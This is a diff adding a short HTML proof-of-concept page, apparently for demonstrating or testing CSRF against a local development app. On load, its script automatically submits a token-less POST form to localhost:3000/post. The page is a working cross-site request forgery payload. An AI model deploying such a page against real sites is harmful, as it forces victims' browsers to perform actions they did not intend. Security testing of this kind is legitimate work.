@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF Attack</title>
+</head>
+<body>
+  <h1>CSRF Attack Page</h1>
+  <form id="csrf-form" action="http://localhost:3000/post" method="POST">
+    <!-- No CSRF token included -->
+    <input type="submit" value="Submit Malicious Draft">
+  </form>
+  <script>
+    // Automatically submit the form when the page loads
+    document.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('csrf-form').submit();
+    });
+  </script>
+</body>
+</html>
